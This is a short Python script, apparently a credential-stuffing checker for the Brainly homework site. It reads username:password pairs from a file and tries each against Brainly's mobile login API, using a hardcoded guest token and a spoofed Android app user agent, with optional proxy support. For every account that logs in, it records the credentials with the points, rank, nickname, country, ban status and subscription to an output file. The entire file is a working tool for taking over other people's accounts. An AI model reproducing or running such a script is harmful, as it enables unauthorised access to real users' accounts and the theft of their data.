import requests, time

guest_token = 'ca1630aba7064033ee1764f3d29ccfa5ef74d013'
auth_url = 'https://ru-api.z-dn.net/api/28/api_account/authorize'
info_url = 'https://ru-api.z-dn.net/api/28/api_users/me'
UserAgent = 'Android-App 4.5.3.1'


base = '1.txt'


def check(username, password, proxies=None):
    try:
        data = {"autologin":True,"client_type":1,"password":password,"username":username}
        headers = {'X-B-Token-Guest':guest_token,
                   'User-Agent':UserAgent,
                   'Content-Type': 'application/json; charset=UTF-8',
                   'Accept-Encoding': 'gzip',
                   }
        r = requests.post(auth_url, json=data, headers=headers, proxies=proxies)
        if r.json()['success'] == True:
            token_long = r.headers['X-B-Token-Long']
            info = requests.get(info_url, headers={'X-B-Token-Long':token_long}, proxies=proxies).json()
            if info['success'] == True:
                rank = info['data']['user']['ranks']['names'][0]
                points = info['data']['user']['points']
                nick = info['data']['user']['nick']
                locale = info['data']['user']['iso_locale']
                ban = info['data']['ban']['active']
                plus = info['data']['brainlyPlus']['subscription']
                result = '''
Данные для входа - {}
Баллов: {}
Ранг: {}
Ник: {}
Страна: {}
Бан: {}
Подписка: {}
-------------------------------------------'''.format(username+':'+password, points, rank, nick, locale, ban, plus)
                return result
    except:
        pass


def main(base):
    start = time.time()
    with open(base) as s:
        for line in s:
            username, password = line.split(':')
            result = check(username.strip(), password.strip())
            try:
                with open('BRAINLY.txt', 'a') as f:
                    f.write(result)
            except TypeError:
                pass
    print('Закончено за {} сек.'.format(round(time.time() - start, 2)))


if __name__ == '__main__':
    main(base)
